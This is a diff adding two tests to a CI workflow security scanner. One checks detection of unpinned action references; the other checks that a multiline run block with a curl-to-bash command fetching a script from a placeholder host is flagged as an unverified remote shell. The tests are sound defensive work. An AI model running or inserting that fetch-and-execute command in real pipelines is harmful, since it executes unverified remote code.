@@ -66,3 +66,14 @@ test('real tracked repository satisfies blocking security baseline',()=>{
   assert.ok(result.files>20);
   assert.deepEqual(result.errors,[]);
 });
+
+test('named action steps are also detected (not only list-item uses)',()=>{
+  const w='- name: Setup Node\n  uses: actions/setup-node@v4\n';
+  const result=inspectWorkflow('.github/workflows/pipeline.yml',w);
+  assert.ok(result.some(x=>x.code==='MUTABLE_ACTION_REFERENCE'));
+});
+test('multiline shell commands cannot conceal curl-to-bash',()=>{
+  const w='- name: Install\n  run: |\n    set -e\n    curl https://example.invalid/setup.sh | bash\n';
+  assert.ok(codes(inspectWorkflow('.github/workflows/pipeline.yml',w))
+    .includes('UNVERIFIED_REMOTE_SHELL'));
+});
